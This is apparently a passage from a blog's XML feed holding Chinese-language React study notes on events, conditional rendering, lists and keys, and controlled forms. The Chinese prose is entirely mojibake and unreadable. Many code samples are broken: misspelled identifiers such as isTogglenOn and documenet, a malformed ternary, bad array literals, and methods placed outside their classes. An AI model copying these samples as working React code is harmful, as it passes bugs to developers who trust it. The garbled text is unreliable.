ç¬¬ä¸€æ­¥ï¼šå°†uiåˆ†è§£ä¸ºç»„ä»¶å±‚æ¬¡ç»“æž„ç»“åˆè®¾è®¡ç¨¿æ¥åˆ†å±‚æ¬¡å‘½å ç¬¬äºŒæ­¥ï¼šåœ¨Reactä¸­æž„å»ºé™æ€ç‰ˆæœ¬æ ¹æ®å±‚æ¬¡ç»“æž„æ¥æž„å»ºé™æ€ç‰ˆæœ¬çš„é¡µé¢ï¼Œä¸è¦æœ‰äº¤äº’ã€‚éœ€è¦æž„å»ºå¯é‡ç”¨ç»„ä»¶å¹¶ä½¿ç”¨propsä¼ é€’æ•°æ®çš„ç»„ä»¶ã€‚ä¸è¦ä½¿ç”¨stateæ¥æž„å»ºé™æ€ç»„ä»¶ã€‚stateç”¨äºŽäº¤äº’æ€§ï¼Œå³éšæ—¶é—´å˜åŒ–çš„æ•°æ®æž„å»ºåˆ†ä¸ºè‡ªä¸Šè€Œä¸‹è·Ÿè‡ªä¸‹è€Œä¸Šã€‚å¤§åž‹é¡¹ç›®æ˜¯è‡ªä¸‹è€Œä¸Šï¼Œå°åž‹åˆ™åä¹‹ã€‚ ç¬¬ä¸‰æ­¥ï¼šç¡®å®šuiçŠ¶æ€çš„æœ€å°ä½†æ˜¯å®Œæ•´è¡¨ç¤ºå½¢å¼ ç¡®å®šæ˜¯å¦ä¸ºstateå¯ä»¥è‡ªé—®ä¸‰ä¸ªé—®é¢˜1.é€šè¿‡propsä»Žçˆ¶æ¯ä¼ å…¥2.éšç€æ—¶é—´æŽ¨ç§»è€Œä¿æŒä¸å˜3.åŸºäºŽç»„ä»¶ä¸­çš„ä»»ä½•stateæˆ–è€…propsæ¥è®¡ç®—å…¶ä¸­ä»»ä½•ä¸€ä¸ªç­”æ¡ˆæ˜¯è‚¯å®šçš„åˆ™ä¸æ˜¯state ç¬¬å››æ­¥ï¼šç¡®å®šstateåœ¨å“ªé‡Œåº”è¯¥å­˜åœ¨å¯¹äºŽåº”ç”¨ç¨‹åºä¸­çš„æ¯ä¸€ä¸ªstate1.ç¡®å®šæ¯ä¸ªåŸºäºŽè¯¥stateå‘ˆçŽ°æŸäº›å†…å®¹çš„ç»„ä»¶2.æ‰¾åˆ°ä¸€ä¸ªå…±åŒçš„æ‹¥æœ‰è€…ç»„ä»¶3.æ— è®ºæ˜¯å…¬å…±æ‰€æœ‰è€…ï¼Œè¿˜æ˜¯ç­‰çº§è¾ƒé«˜çš„å…¶ä»–ç»„æˆéƒ¨åˆ†éƒ½åº”è¯¥æ‹¥æœ‰è¯¥state4.å¦‚æžœæ— æ³•æ‰¾åˆ°ä¸€ä¸ªæœ‰æ„è¯†æ‹¥æœ‰è¿™ä¸ªstateçš„ç»„ä»¶ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ç»„ä»¶ï¼Œåªæ˜¯ä¸ºäº†ä¿å­˜stateå¹¶å°†å®ƒæ·»åŠ åˆ°å…¬å…±æ‰€æœ‰ è€…ç»„ä»¶ä¸Šæ–¹çš„å±‚æ¬¡ç»“æž„ä¸­çš„æŸå¤„ ç¬¬äº”æ­¥ï¼šæ·»åŠ åå‘æ•°æ®æµå‚è€ƒé“¾æŽ¥ï¼šhttps://react.docschina.org/docs/hello-world.html]]></content>
      <categories>
        <category>reactç›¸å…³</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react-day2]]></title>
    <url>%2F2018-06-04-react-second-day.html</url>
    <content type="text"><![CDATA[react å­¦ä¹ ç¬”è®°day-02å¤„ç†äº‹ä»¶ä½¿ç”¨Reactå…ƒç´ å¤„ç†äº‹ä»¶ä¸Žå¤„ç†DOMå…ƒç´ ä¸Šçš„äº‹ä»¶éžå¸¸ç›¸ä¼¼ï¼Œæœ‰ä¸€äº›è¯­æ³•å·®å¼‚Reactäº‹ä»¶ä½¿ç”¨camelCaseå‘½åï¼Œè€Œä¸æ˜¯å°å†™ä½¿ç”¨JSXï¼Œå°†ä¼ é€’å‡½æ•°ä½œä¸ºäº‹ä»¶å¤„ç†å‡½æ•°ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸² HTMLï¼š &lt;button onclick = &quot;activateLasers()&quot;&gt;Activate Lasers&lt;/button&gt; React: &lt;button onClick={activateLasers}&gt;Activate Lasers&lt;/button&gt; å¦å¤–ä¸€ä¸ªåŒºåˆ«æ˜¯ï¼Œæ— æ³•è¿”å›žfalseä»¥é˜²Reactçš„é»˜è®¤è¡Œä¸ºï¼Œå¿…é¡»ä½¿ç”¨preventDefaultæ˜Žç¡®è°ƒç”¨ã€‚ HTML: &lt;a href=&quot;#&quot; onclick=&quot;conslog.log(&#39;The link was clicked&#39;); return false&quot;&gt;Click me&lt;/a&gt; Reactï¼š 1234567891011function ActionLink()&#123; function handleClick(e)&#123; e.preventDefault(); console.log(&apos;The link was clicked.&apos;); &#125; return( &lt;a href=&quot;#&quot; onClick=&#123;handleClick&#125;&gt; Click me &lt;/a&gt; );&#125; ä½¿ç”¨Reactï¼Œé€šå¸¸ä¸éœ€è¦è°ƒç”¨addEventListeneræ·»åŠ ä¾¦å¬å™¨åˆ°DOMå…ƒç´ åŽåˆ›å»ºï¼Œç›¸åï¼Œåªéœ€åœ¨å…ƒç´ åˆå§‹å‘ˆçŽ°æ—¶æä¾›ä¾¦å¬å™¨Toggleç»„ä»¶ 12345678910111213141516171819202122232425class Toggle extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123;isTogglenOn:true&#125;; this.handleClick = this.handleClick.bind(this); &#125; handleClick()&#123; this.setState(prevState =&gt; (&#123; isToggleOn: !prevState.isToggleOn &#125;)); &#125; render()&#123; return( &lt;button onClick=&#123;this.handleClick&#125;&gt; &#123;this.state.isToggleOn?&apos;ON&apos;?&apos;OFF&apos;&#125; &lt;/button&gt; ); &#125;&#125;React.render( &lt;Toggle/&gt;, document.getElementById(&apos;root&apos;);); å¦‚æžœå¼•ç”¨ä¸€ä¸ªæ²¡æœ‰ï¼ˆï¼‰åŽé¢çš„æ–¹æ³•ï¼Œæ¯”å¦‚onClick={this.handleClick}ä½ åº”è¯¥ç»‘å®šé‚£ä¸ªæ–¹æ³• 123456789101112class LoggingButton extends React.component&#123; handleClick = () =&gt;&#123; console.log(&apos;this is &apos;,this); &#125; render()&#123; return( &lt;button onclick=&#123;this.handleClick&#125;&gt; Click me &lt;/button&gt; ) &#125;&#125; å°†å‚æ•°ä¼ é€’ç»™äº‹ä»¶å¤„ç†ç¨‹åºåœ¨å¾ªçŽ¯å†…éƒ¨ï¼Œé€šå¸¸éœ€è¦å°†ä¸€ä¸ªé¢å¤–çš„å‚æ•°ä¼ é€’ç»™äº‹ä»¶å¤„ç†ç¨‹åºã€‚ä¸‹ä¾‹ï¼Œidæ˜¯è¡ŒID &lt;button onClick={(e) =&gt; this.deleteRow(id,e)}&gt;Delete Row&lt;/button&gt;&lt;button onClcik={this.deleteRow.bind(this,id)}&gt;Delete Row&lt;/button&gt; eä»£è¡¨Reactäº‹ä»¶çš„å‚æ•°éƒ½å°†ä½œä¸ºIDä¹‹åŽçš„ç¬¬äºŒä¸ªå‚æ•°ä¼ é€’ï¼Œä½¿ç”¨ç®­å¤´å‡½æ•°ï¼Œæˆ‘ä»¬å¿…é¡»æ˜Žç¡®ä¼ é€’å®ƒï¼Œä½†æ˜¯bindä»»ä½•æ›´å¤šçš„å‚æ•°éƒ½ä¼šè‡ªåŠ¨è½¬å‘ æœ‰æ¡ä»¶çš„æ¸²æŸ“Reactä¸­ï¼Œå¯ä»¥åˆ›å»ºå°è£…æ‰€éœ€è¡Œä¸ºçš„ç‹¬ç‰¹ç»„ä»¶ï¼Œå¯ä»¥ä»…æ¸²æŸ“å…¶ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œå…·ä½“å–å†³äºŽåº”ç”¨ç¨‹åºçš„çŠ¶æ€Reactä¸­çš„æ¡ä»¶å‘ˆçŽ°ä¸Žæ¡ä»¶è·Ÿjsçš„å·¥ä½œæ–¹å¼ç›¸åŒï¼Œä½¿ç”¨jsçš„ifè¿ç®—ç¬¦ï¼Œæˆ–è€…æ˜¯æ¡ä»¶è¿ç®—ç¬¦åˆ›å»ºè¡¨ç¤ºå½“å‰çŠ¶æ€çš„å…ƒç´ ï¼Œå¹¶è®©Reactæ›´æ–°UIæ¥åŒ¹é…å®ƒä»¬ 123456789101112131415161718function UserGreeting(props)&#123; return &lt;h1&gt;Welcome back!&lt;/h1&gt;;&#125;function GuestGreeting(props)&#123; return &lt;h1&gt;Please sign up.&lt;/h1&gt;&#125;function Greeting(props)&#123; const isLoggedIn = props.isLoggedIn; if(isLoggedIn)&#123; return &lt;UserGreeting/&gt;; &#125; return &lt;GuserGreeting/&gt;;&#125;React.render( &lt;GuestGreeting isLoggedIn=&#123;false&#125;/&gt;, documenet.getElementById(&apos;root&apos;);); å…ƒç´ å˜é‡å¯ä»¥ä½¿ç”¨å˜é‡æ¥å­˜å‚¨å…ƒç´ ï¼Œæœ‰æ¡ä»¶åœ°æ¸²æŸ“ç»„ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œè€Œå…¶ä½™è¾“å‡ºä¸ä¼šæ›´æ”¹ ä»£è¡¨æ³¨é”€å’Œç™»å½•æŒ‰é’®çš„æ–°ç»„ä»¶ 1234567891011121314function LoginButton(props)&#123; return( &lt;button onClick = &#123;props.onClick&#125;&gt; Login &lt;/button&gt; );&#125;function LogoutButton(props)&#123; return( &lt;button onClick = &#123;props.onClick&#125;&gt; Logout &lt;/button&gt; );&#125; åˆ›å»ºæœ‰çŠ¶æ€çš„ç»„ä»¶LoginControl,å‘ˆçŽ°&lt;LoginButton/&gt;æˆ–&lt;LogoutButton/&gt;æ ¹æ®å…¶å½“å‰çŠ¶æ€ï¼Œå®ƒä¹Ÿä¼šå‘ˆçŽ°ä¸€ä¸ª&lt;Greeting/&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970class LoginControl extends React.Component&#123; constructor(props)&#123; super(props); this.handleLoginClick = this.handleLoginClick.bind(this); this.handleLogoutClick = this.handleLogoutClick.bind(this); this.state = &#123;isLoggedIn : false&#125;; &#125; handleLoginClick()&#123; this.setState(&#123;isLoggedIn:true&#125;); &#125; handleLogoutClick(&#123; this.setState(&#123;isLoggedIn:false&#125;); &#125;); render()&#123; const isLoggedIn = this.state.isLoggedIn; let button = null; if (isLoggedIn) &#123; button = &lt;LogoutButton onClick=&#123;this.handleLogoutClick&#125; /&gt;; &#125; else &#123; button = &lt;LoginButton onClick=&#123;this.handleLoginClick&#125; /&gt;; &#125; return( &lt;div&gt; &lt;Greeting isLoggedIn = &#123;isLoggedIn&#125; /&gt; &#123;button&#125; &lt;/div&gt; ); &#125;&#125;function UserGreeting(props)&#123; return &lt;h1&gt;Welcome back!&lt;/h1&gt;&#125;function GuestGreeting(props)&#123; return &lt;h1&gt;Please sign up.&lt;/h1&gt;&#125;function Greeting(props)&#123; const isLoggedIn = props.isLoggedIn; if(isLoggedIn)&#123; return &lt;UserGreeting /&gt;; &#125; return &lt;GusetGreeting /&gt;;&#125;function LoginButton(props)&#123; return( &lt;button onClick = &#123;props.onClick&#125;&gt; Login &lt;/button&gt; );&#125;function LogoutButton()&#123; return( &lt;button onClick = &#123;props.onClick&#125;&gt; Logout &lt;/button&gt; )&#125;ReactDOM.render( &lt;LoginControl /&gt;, document.getElementById(&apos;root&apos;);); å†…è”ä½¿ç”¨é€»è¾‘&amp;&amp;è¿ç®—ç¬¦åŒ…è£¹åœ¨èŠ±æ‹¬å·ä¸­åµŒå…¥JSXçš„ä»»ä½•è¡¨è¾¾å¼ä¸­ 1234567891011121314151617function Mailbox(props)&#123; const unreadMessage = props.unreadMessage; return( &lt;div&gt; &lt;h1&gt;Hello&lt;/h1&gt; &#123;unreadMessage.length &gt; 0 &amp;&amp; &lt;h2&gt; You have &#123;unreadMessage.length &#125; unread message&lt;/h2&gt; &#125; &lt;/div&gt; );&#125;const message = [&apos;React&apos;,&apos;Re:React&apos;,&apos;Re:Re:React&apos;]; ReactDOM.render( &lt;Mail unreadMessage = &#123;message&#125; /&gt;, document.getElementById(&apos;root&apos;);); ä¸Žæ¡ä»¶å…ƒç´ å†…è”ä½¿ç”¨if-elseeg1: 12345678render()&#123; const isloggedIn = this.state.isLoggedIn; return( &lt;div&gt; The user is &lt;b&gt; &#123;isLoggIn ? &apos;currently&apos; : &apos;not&apos;&#125;&lt;/b&gt; logged in &lt;/div&gt; );&#125; eg2: 1234567891011121314render()&#123; const isLoggedIn = this.state.isLoggedIn; return( &lt;div&gt; &#123; isLoggedIn ? ( &lt;LogoutButton onClick = &#123;this.handleLogoutClick /&#125;&gt; ):( &lt;LoginButton onClick = &#123;this.handleLoginClick&#125; /&gt; ) &#125; &lt;/div&gt; );&#125; é˜²æ­¢ç»„ä»¶å‘ˆçŽ°ç»„ä»¶å¯ä»¥éšè—è‡ªèº«ï¼Œnull 12345678910111213141516171819202122232425262728293031323334353637383940function WarningBanner(props)&#123; if(!props.warn)&#123; return null; &#125; return( &lt;div className=&quot;warning&quot;&gt; Warning! &lt;/div&gt; );&#125;class Page extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123;showWarning: true&#125;; this.handleToggleClick = this.handleToggleClick.bind(this); &#125;&#125;handleToggleClick()&#123; this.setState(prevState =&gt;(&#123; showWarning : !prevState.showWarning &#125;));&#125;render()&#123; return( &lt;div&gt; &lt;WarningBanner warn = &#123;this.state.showWarning&#125; /&gt; &lt;button onClick = &#123;this.handleToggleClick&#125;&gt; &#123;this.state.showWarning ? &apos;Hide&apos;: &apos;Show&apos;&#125; &lt;/button&gt; &lt;/div&gt; );&#125;ReactDOM.render( &lt;Page/&gt;, document.getElementById(&apos;root&apos;)); nullä»Žç»„ä»¶çš„renderæ–¹æ³•è¿”å›žä¸ä¼šå½±å“å£°æ˜Žå‘¨æœŸæ–¹æ³•çš„è§¦å‘ åˆ—è¡¨å’Œé”®jsä¸­è½¬æ¢åˆ—è¡¨ï¼Œmapå‡½æ•°æ¥èŽ·å–numberså¹¶å°†å…¶å€¼åŠ å€ 123const numbers = [1,2,3,4,5];const doubled = numbers.map((number) =&gt; number*2);console.log(doubled); è€Œåœ¨Reactä¸­ï¼Œå°†æ•°ç»„è½¬æ¢ä¸ºå…ƒç´ åˆ—è¡¨å‡ ä¹Žå®Œå…¨ä¸€æ · æ¸²æŸ“å¤šä¸ªç»„ä»¶å¯ä»¥æž„å»ºå…ƒç´ é›†åˆï¼Œå¹¶ä½¿ç”¨å¤§æ‹¬å·å°†å…¶åŒ…å«åœ¨JSXä¸­ {}numbersä½¿ç”¨js mapå‡½æ•°éåŽ†æ•°ç»„ï¼Œliä¸ºæ¯ä¸ªé¡¹ç›®è¿”å›žä¸€ä¸ªå…ƒç´ ï¼Œæœ€åŽå°†å¾—åˆ°çš„å…ƒç´ æ•°ç»„åˆ†é…ç»™listItems 12const numbers = [1,2,3,4,5];const listItems = number.map((number) =&gt; &lt;li&gt;&#123;number&#125;&lt;/li&gt;); å†å°†æ•´ä¸ªlistItemsæ•°ç»„åŒ…å«åœ¨ä¸€ä¸ªulå…ƒç´ ä¸­ï¼Œå¹¶å°†å…¶å‘ˆçŽ°ç»™DOM 1234ReactDOM.render( &lt;ul&gt;&#123;listItems&#125;&lt;/ul&gt;, document.getElementById(&apos;root&apos;)); åŸºæœ¬åˆ—è¡¨ç»„ä»¶ ç»„ä»¶ä¸­æ¸²æŸ“åˆ—è¡¨å¯ä»¥å°†å‰é¢çš„ä¾‹å­é‡æž„ä¸ºä¸€ä¸ªç»„ä»¶ï¼Œè¯¥ç»„ä»¶æŽ¥å—ä¸€ä¸ªæ•°ç»„numberså¹¶è¾“å‡ºä¸€ä¸ªæ— åºçš„å…ƒç´ åˆ—è¡¨ 12345678910111213function NumberList(props)&#123; const number = props.number; const listItems = number.map((number) =&gt; &lt;li&gt;&#123;number&#125;&lt;/li&gt;); return( &lt;ul&gt; &#123;listItems&#125; &lt;/ul&gt; );&#125;const number = []1,2,3,4,5];ReactDOM.render( &lt;NumberList numbers = &#123;numbers&#125; /&gt;, document.getElementById(&apos;root&apos;)); è¿è¡Œè¿™æ®µä»£ç æ—¶ï¼Œä¼šç»™ä½ ä¸€ä¸ªè­¦å‘Šï¼Œå³åº”è¯¥ä¸ºåˆ—è¡¨é¡¹æä¾›ä¸€ä¸ªå¯†é’¥ã€‚â€œé”®â€æ˜¯åœ¨åˆ›å»ºå…ƒç´ åˆ—è¡¨æ—¶éœ€è¦åŒ…å«çš„ç‰¹æ®Šå­—ç¬¦ä¸²å±žæ€§ 12345678910111213141516function NumberList(props)&#123; const numbers = props.numbers; const listItems = number.map((number) =&gt; &lt;li key=&#123;number.toString()&#125;&gt; &#123;number&#125; &lt;/li&gt; ); return( &lt;ul&gt;&#123;listItems&#125;&lt;/ul&gt; );&#125;const numbers = [1,2,3,4,5];ReactDOM.render( &lt;NumberList number = &#123;numbers&#125; /&gt;, document.getElementById(&apos;root&apos;)); é”®å¯ä»¥å¸®åŠ©Reactè¯†åˆ«å“ªäº›é¡¹ç›®å·²ç»æ›´æ”¹ï¼Œæ·»åŠ ï¼Œåˆ é™¤ã€‚é”®åº”è¯¥èµ‹äºˆæ•°ç»„å†…ç¨³å®šçš„å…ƒç´  123456const numbers - [1,2,3,4,5];const listItems = number.map((number) =&gt; &lt;li key = &#123;number.toString()&#125;&gt; &#123;number&#125;&lt;/li&gt;); é€‰æ‹©idä½œä¸ºæ ‡å¿—å…³é”®å­—æ¯”è¾ƒå¤š12345const todoItems = todo.map((todo) =&gt; &lt;li key = &#123;todo.id&#125;&gt; &#123;todo.text&#125;&lt;/li&gt;); å¦‚æžœæ²¡æœ‰ç¨³å®šidï¼Œå¯ä»¥ä½¿ç”¨ç´¢å¼• 12345const todoItems = todos.map((todo,index) =&gt;&lt;li key = &#123;index&#125;&gt; &#123;todo.text&#125;&lt;/li&gt;); å¦‚æžœé¡¹ç›®çš„é¡ºåºä¼šæ”¹å˜çš„è¯ï¼Œåˆ™ä¸å»ºè®®ä½¿ç”¨ç´¢å¼•ï¼Œè¿™å¯èƒ½ä¼šå¯¹æ€§èƒ½é€ æˆè´Ÿé¢å½±å“ï¼Œå¹¶å¯èƒ½å¸¦æ¥ç»„ä»¶çŠ¶æ€é—®é¢˜ã€‚ ç”¨é”®æå–ç»„ä»¶æå–listItemç»„ä»¶ï¼Œä¿ç•™æ•°ç»„ä¸­çš„å…ƒç´ è€Œä¸æ˜¯æœ¬èº«liå…ƒç´  1234567891011121314151617function ListItem(props)&#123; return &lt;li&gt;&#123;props.value&#125;&lt;/li&gt;&#125;function NumberList(props)&#123; const numbers = props.number; const listItems = numbers.map((number) =&gt; &lt;ListItem key = &#123;number.toString()&#125; value = &#123;number&#125; /&gt; ); return( &lt;ul&gt;&#123;listItems&#125;&lt;/ul&gt; );&#125;const numbers = [1,2,3,4,5];ReactDOM.render( &lt;NumberList numbers = &#123;numbers&#125; /&gt;, document.getElementById(&apos;root&apos;)); keyåœ¨å…„å¼Ÿå§å¦¹ä¸­å¿…é¡»æ˜¯å”¯ä¸€çš„åœ¨æˆ‘ä»¬ç”Ÿæˆä¸¤ä¸ªä¸åŒæ•°ç»„çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ç›¸åŒçš„é”® 12345678910111213141516171819202122232425262728function Blog(props)&#123; const sidebar = ( &lt;ul&gt; &#123;props.posts.map(post) =&gt;&#123; &lt;li key = &#123;post.id&#125;&gt;&#123;post.title&#125;&lt;/li&gt; &#125;&#125; &lt;/ul&gt; ); const content = props.posts.map((post) =&gt; &lt;div key = &#123;post.id&#125;&gt; &lt;h3&gt;&#123;post.title&#125;&lt;/h3&gt; &lt;p&gt;&#123;post.content&#125;&lt;/p&gt; &lt;/div&gt; ); return ( &lt;div&gt; &#123;sidebar&#125; &lt;hr/&gt; &#123;content&#125; &lt;/div&gt; );&#125;const posts = [&#123;id;1,title:&apos;title1&apos;,content:&apos;content1&apos;&#125;,&#123;id;2,title:&apos;title2&apos;,content:&apos;content2&apos;&#125;];ReactDOM.render( &lt;Blog posts = &#123;posts&#125;&gt;, document.getElementById(&apos;root&apos;)); åœ¨JSXåµŒå…¥map()12345678910function NumberList(props)&#123; const numbers = props.number; return( &lt;ul&gt; &#123;number.map(number) =&gt; &lt;ListItem key = &#123;number.toString()&#125; value = &#123;number&#125; /&gt; &#125; &lt;/ul&gt; );&#125; è¿™æ ·åµŒå¥—ä½¿ç”¨æœ‰å¯èƒ½æé«˜äº†å¯è¯»æ€§ï¼Œä½†æ˜¯å¦‚æžœmapåµŒå¥—èµ·æ¥å¤ªå¤æ‚çš„è¯å°±å¯ä»¥è€ƒè™‘æå–ç»„ä»¶å‡ºæ¥ å½¢å¼formså—æŽ§ç»„ä»¶è¡¨å•å…ƒç´ ï¼ˆInput/textarea/selectï¼‰é€šå¸¸ä¿æŒè‡ªå·±çš„çŠ¶æ€å¹¶æ ¹æ®ç”¨æˆ·è¾“å…¥æ›´æ–°ï¼Œåœ¨Reactä¸­ï¼Œå¯å˜çŠ¶æ€é€šå¸¸ä¿å­˜åœ¨ç»„ä»¶çš„çŠ¶æ€å±žæ€§ä¸­ï¼Œå¹¶ä¸”æ›´æ–°åªèƒ½ä½¿ç”¨setState()å¯ä»¥é€šè¿‡ä½¿ReactçŠ¶æ€æˆä¸ºå•ä¸€çœŸç›¸æºæ¥ç»“åˆç€ä¸¤è€…ï¼Œç„¶åŽå‘ˆçŽ°è¡¨å•çš„Reactç»„ä»¶ä¹ŸæŽ§åˆ¶åŽç»­ç”¨æˆ·è¾“å…¥ä¸­ä»¥è¯¥è¡¨å•å‘ç”Ÿçš„äº‹æƒ…ã€‚è¾“å…¥è¡¨å•å…ƒç´ çš„å€¼ç”±Reactä»¥è¿™ç§æ–¹å¼æŽ§åˆ¶ï¼Œå«åšâ€˜å—æŽ§ç»„ä»¶â€™ 12345678910111213141516171819202122232425262728293031323334class NameForm extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123;value:&apos;&apos;&#125;; this.handleChange = this.handleChange.bind(this); this.handleSubmit = this.handleSubmit.bind(this); &#125;&#125;handleChange(event)&#123; this.setState(&#123;value:event.targer.value&#125;);&#125;handleSubmit(event)&#123; alert(&apos;æäº¤çš„å€¼ä¸ºï¼š &apos; +this.state.value); event.preventDefault();&#125;render()&#123; return( &lt;form onSubmit = &#123;this.handleSubmit&#125;&gt; &lt;label&gt; Name: &lt;input type=&quot;text&quot; value = &#123;this.state.value&#125; onChange = &#123;this.handleChange&#125; /&gt; &lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;/&gt; &lt;/form&gt; );&#125;ReactDOM.render()&#123; &lt;NameForm /&gt;, document.getElementById(&apos;root&apos;)&#125; ç”±äºŽvalueå±žæ€§è®¾ç½®åœ¨è¡¨å•å…ƒç´ ä¸Šï¼Œå› æ­¤æ˜¾ç¤ºçš„å€¼å°†å§‹ç»ˆä¸ºthis.state.value,ä½¿ReactçŠ¶æ€æˆä¸ºçœŸå€¼çš„æ¥æºï¼Œç”±äºŽhandleChangeæ¯æ¬¡å‡»é”®æ—¶éƒ½ä¼šè¿è¡Œä»¥æ›´æ–°ReactçŠ¶æ€ï¼Œå› æ­¤æ˜¾ç¤ºçš„å€¼å°†éšç”¨æˆ·é”®å…¥è€Œæ›´æ–° å¯¹äºŽå—æŽ§ç»„ä»¶ï¼Œæ¯ä¸ªçŠ¶æ€å˜å¼‚éƒ½ä¼šæœ‰ä¸€ä¸ªå…³è”çš„å¤„ç†å‡½æ•°ï¼Œè¿™ä½¿ä¿®æ”¹æˆ–éªŒè¯ç”¨æˆ·è¾“å…¥å˜å¾—éžå¸¸ç®€å•ï¼Œä¾‹å¦‚æˆ‘ä»¬æƒ³å¼ºåˆ¶å…¨éƒ¨å¤§å†™æ¥ç¼–å†™åç§° 123handleChange(event)&#123; this.setState(&#123;value:event.target.value.toUpperCase()&#125;);&#125; textareaæ ‡ç­¾HTMLä¸­ï¼š &lt;textarea&gt;textarea&lt;/textarea&gt; Reactä¸­ï¼Œvalueå±žæ€§ä»£è¡¨textareaçš„å€¼ 12345678910111213141516171819202122232425262728293031323334353637class EssayForm extends React.Component&#123; construct(props)&#123; super(props); this.state = &#123; value:&apos;textarea 123321&apos; &#125;; this.handleChange = this.handleChange.bind(this); this.handleSubmit = this.handleSubmit.bind(this); &#125; handleChange()&#123; this.setState(&#123;value:event.target.value&#125;); &#125; handleSubmit()&#123; alert(&apos;new textarea content is&apos; +this.state); event.preventDefault(); &#125; render()&#123; return( &lt;form onSubmit = &#123;this.handleSubmit&#125;&gt; &lt;label&gt; textarea: &lt;textarea value = &#123;this.state.value&#125; onChange = &#123;this.handleChange&#125; /&gt; &lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; ); &#125;&#125;;ReactDOM.render( &lt; EssayForm/&gt;, document.getElementById(&apos;root&apos;)); é€‰æ‹©æ ‡ç­¾HTMLä¸­ï¼š 123456&lt;select&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot; selected&gt;3&lt;/option&gt; &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt;&lt;/select&gt; Reactä¸­ï¼š 12345678910111213141516171819202122232425262728293031323334353637class FlavorForm extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123;value:&apos;2&apos;&#125; this.handleChange = this.handleChange.bind(this); this.handleSubmit = this.handleSubmit.bind(this); &#125; handleChange(event)&#123; this.setState(&#123;value:event.target.value&#125;); &#125; this.handleSubmit(event)&#123; alert(&apos;é€‰ä¸­â€™+this.target.value); event.preventDefault(); &#125; render()&#123; return( &lt;form onSubmit = &#123;this.handleSubmit&#125;&gt; &lt;select onChange = &#123;this.handleChange&#125; value=&#123;this.state.value&#125;&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;/&gt; &lt;form/&gt; ); &#125;&#125;ReactDOM.render( &lt;FlavorFrom /&gt;, document.getElementById(&apos;root&apos;)); æ€»çš„æ¥è¯´ï¼Œ&lt;input type=&quot;text&quot;&gt;,&lt;textarea&gt;å’Œ&lt;select&gt;æ‰€æœ‰çš„å·¥ä½œè¿‡ç¨‹éƒ½æ¯”è¾ƒç›¸ä¼¼ï¼Œéƒ½å¯ä»¥æŽ¥å—valueï¼Œå¯ä»¥é€šè¿‡å®ƒå®žçŽ°æŽ§åˆ¶ç»„ä»¶çš„å±žæ€§ æ³¨æ„ï¼š å¯ä»¥å°†æ•°ç»„ä¼ é€’ç»™valueå±žæ€§ï¼Œä»Žè€Œåœ¨selectæ ‡ç­¾ä¸­é€‰æ‹©å¤šä¸ªé€‰é¡¹ &lt;select multiple = {true} value={[â€˜Bâ€™,â€™Câ€™]}&gt; æ–‡ä»¶è¾“å…¥æ ‡ç­¾ å®ƒçš„å€¼æ˜¯åªè¯»çš„ï¼Œæ‰€ä»¥å®ƒæ˜¯Reactä¸­ä¸å—æŽ§åˆ¶çš„ç»„ä»¶ HTMLï¼š &lt;input type = &quot;file&gt;&quot; å¤„ç†å¤šä¸ªè¾“å…¥å½“éœ€è¦å¤„ç†å¤šä¸ªå—æŽ§inputå…ƒç´ æ—¶ï¼Œå¯ä»¥nameä¸ºæ¯ä¸ªå…ƒç´ æ·»åŠ ä¸€ä¸ªå±žæ€§ï¼Œå¹¶è®©æˆå¤„ç†å‡½æ•°æ ¹æ®å€¼æ¥é€‰æ‹©è¦æ‰§è¡Œçš„æ“ä½œevent.target.name 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class Reservation extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123; isGoing:true, numberOfGuset:2 &#125;; this.handleInputChange = this.handleInputChange.bind(this); &#125; handleInputChange(event)&#123; const target = event.target; const value = target.type === &apos;checkbox&apos; ? target.checked : target.value; const name = target.name; this.setState(&#123; [name]:value &#125;); &#125; render()&#123; return&#123; &lt;form&gt; &lt;label&gt; Is going: &lt;input name = &quot;isGoing&quot; type = &quot;checkbox&quot; checked = &#123;this.state.isGoing&#125; onChange = &#123;this.handleInputChange&#125; /&gt; &lt;/label&gt; &lt;br/&gt; &lt;label&gt; Number of guests &lt;input name = &quot;numberOfGuests&quot; type = &quot;number&quot; value = &#123;this.state.numberOfGuset&#125; onChange = &#123;this.handleInputChange&#125; /&gt; &lt;/label&gt; &lt;/form&gt; &#125; &#125;&#125; ReactDOM.render( &lt;Reservation/&gt;, document.getElementById(&apos;root&apos;)); å…¶ä¸­ 123this.setState(&#123; [name]:value&#125;); ç›¸å½“äºŽä¸‹é¢çš„è¿™ä¸ªes5ä»£ç : 123var pratialState = &#123;&#125;;pratialState[name] = value;this.setState(pratialState); å—æŽ§ç»„ä»¶çš„æ›¿ä»£å“ä½¿ç”¨å—æŽ§ç»„ä»¶æœ‰æ—¶ä¼šéžå¸¸ä¹å‘³ï¼Œå› 